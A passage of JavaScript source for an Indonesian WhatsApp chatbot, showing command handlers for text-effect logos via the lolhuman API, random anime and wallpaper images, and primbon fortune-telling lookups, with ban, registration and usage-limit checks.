		case 'wooden3d':
		case 'textbyname':
		case 'writegalacy':
		case 'galaxybat':
		case 'snow3d':
		case 'birthdayday':
		case 'goldplaybutton':
		case 'silverplaybutton':
		case 'freefire':
	if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
		if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} ${global.wm} `)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apilol}&text=${args}`}, caption: `Created By ary-md\n\n Type: ${command}\n\nText: ${args}`})
			break

        case 'shadow':
		case 'cup':
		case 'cup1':
		case 'romance':
		case 'smoke':
		case 'burnpaper':
		case 'lovemessage':
		case 'undergrass':
		case 'love':
		case 'coffe':
		case 'woodheart':
		case 'woodenboard':
		case 'summer3d':
		case 'wolfmetal':
		case 'nature3d':
		case 'underwater':
		case 'golderrose':
		case 'summernature':
		case 'letterleaves':
		case 'glowingneon':
		case 'fallleaves':
		case 'flamming':
		case 'harrypotter':
		case 'carvedwood':
	if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
		if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} ${global.wm}`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${apilol}&text=${args}`}, caption: `Created By ary-md\n\n Type: ${command}\n\nText: ${args}`})
			break

    // Text Prome
        case 'pornhub':
		case 'glitch':
		case 'avenger':
		case 'space':
		case 'ninjalogo':
		case 'marvelstudio':
		case 'lionlogo':
		case 'wolflogo':
		case 'steel3d':
		case 'wallgravity':
	if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
		if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} ${global.wm}`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 4 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${apilol}&text1=${args[0]}&text2=${args[1]}`}, caption: `Created By ArybotzMD\n\n Type: ${command}\n\nText: ${args}`})
			break
case 'silverplay': case 'silverplaybutton': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (args.length == 0) return newReply(`Example: ${command} zkyofc`)
conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/silverplaybutton?apikey=${apilol}&text=${args[0]}`}, caption: `Nih`})
}
break
        case 'blackpink':
		case 'neon':
		case 'greenneon':
		case 'advanceglow':
		case 'futureneon':
		case 'sandwriting':
		case 'sandsummer':
		case 'sandengraved':
		case 'metaldark':
		case 'neonlight':
		case 'holographic':
		case 'text1917':
		case 'minion':
		case 'deluxesilver':
		case 'newyearcard':
		case 'bloodfrosted':
		case 'halloween':
		case 'jokerlogo':
		case 'fireworksparkle':
		case 'natureleaves':
		case 'bokeh':
		case 'toxic':
		case 'strawberry':
		case 'box3d':
		case 'roadwarning':
		case 'breakwall':
		case 'icecold':
		case 'luxury':
		case 'cloud':
		case 'summersand':
		case 'horrorblood':
		case 'thunder':
	if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
		if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} ${global.wm}`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apilol}&text=${args}` }, caption: `Created By ary-md\n\n Type: ${command}\n\nText: ${args}`})
			break
	    
	        case 'yotsuba':
            case 'shinomiya':
            case 'yumeko':
            case 'tejina':
            case 'chiho':
            case 'boruto':
            case 'kaori':
            case 'shizuka':
            case 'kaga':
            case 'gremory':
            case 'kagura':
            case 'hinata':
            case 'minato':
            case 'naruto':
            case 'sagiri':
            case 'anna':
            case 'deidara':
            case 'yuki':
            case 'asuna':
            case 'chitoge':
            case 'emilia':
            case 'inori':
            case 'madara':
            case 'sasuke':
            case 'one piece':
            case 'kotori':
            case 'mikasa':
            case 'akiyama':
            case 'shine':
            case 'shinka':
            case 'nezuko':
            case 'rize':
            case 'anna':
            case 'ayuzawa':
            case 'hestia':
            case 'Itachi':
            case 'sakura':
            case 'tsunade':
            case 'kencki':
            case 'toukachan':
            case 'akira':
            case 'itori':
            case 'kurumi':
            case 'miku':
            case 'elaina':
            case 'pokemon': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -3 limit
                let { pinterest } = require('./lib/scraper')
                let anui = await pinterest(command + 'Anime')
                result = anui[Math.floor(Math.random() * anui.length)]               
                conn.sendMessage(m.chat, { image: { url: result }, caption: `Random Anime ${command}` }, { quoted: m })
        }
        break
        case 'aesthetic':
            case 'anjing':
            case 'blankpink':
            case 'boneka':
            case 'darkjokes':
            case 'hekel':
            case 'justina':
            case 'kpop':
            case 'kucing':
            case 'mobil':
            case 'motor':
            case 'pubg':
            case 'rose':
            case 'ryujin':
            case 'wallhp': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
            newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Random%20Image/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done }, { quoted: m })
            }
        break
			case 'cyberspace':
            case 'mountain':
            case 'programming':
            case 'technology': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
            newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Wallpaper/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done }, { quoted: m })
            }
            break
            case 'cecan':
            case 'china':
            case 'cogan':
            case 'indonesia':
            case 'japan':
            case 'korea':
            case 'malaysia':
            case 'thailand':
            case 'vietnam': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done }, { quoted: m })
            }
            break
            case 'couple': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')    
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let random = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(m.chat, {
                    image: {
                        url: random.male
                    },
                    caption: `Couple Male`
                }, {
                    quoted: m
                })
                conn.sendMessage(m.chat, {
                    image: {
                        url: random.female
                    },
                    caption: `Couple Female`
                }, {
                    quoted: m
                })
            }
            break
            case 'wikimedia': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply('Mau Cari Wikimedia Apa?')
                newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let {
                    wikimedia
                } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done}, { quoted: m })
            }
            break
            
            case 'logo1':
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
            if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit)
            db.data.users[m.sender].limit -= 2
            if (!text) return newReply(`Example: ${prefix + command} ${global.wm}`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/fpslogo?apikey=${lolhuman}&text=${text}` } })
			break
			case 'logo2':
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit)
            db.data.users[m.sender].limit -= 2
            if (!text) return newReply(`Example: ${prefix + command} ${global.wm}`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/logogaming?apikey=${lolhuman}&text=${text}` } })
			break
			case 'logo3':
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit)
            db.data.users[m.sender].limit -= 2
            if (!text) return newReply(`Example: ${prefix + command} ${global.wm}`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/metallogo?apikey=${lolhuman}&text=${text}` } })
			break
			case 'logo4':
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit)
            db.data.users[m.sender].limit -= 2
            if (!text) return newReply(`Example: ${prefix + command} ${global.wm}`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/jokerlogo?apikey=${lolhuman}&text=${args[0]}` } })
			break
            
			case 'nomerhoki': case 'nomorhoki': {
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
                if (!Number(text)) return newReply(`Contoh : ${prefix + command} 6288292024190`)
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nomor HP :* ${anu.message.nomer_hp}\n• *Angka Shuzi :* ${anu.message.angka_shuzi}\n• *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n• *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
           if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
                if (!text) return newReply(`Contoh : ${prefix + command} belanja`)
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
           if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
           if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} Dika Ardianta`)
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
                if (!text) return newReply(`Contoh : ${prefix + command} Dika|Novia`)
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} 6, 12, 2020`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!ext)return newReply(`Contoh : ${prefix+ command} 28, 12, 2021`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            
            case 'ramalannasib': case 'ramalnasib': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return `Contoh : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
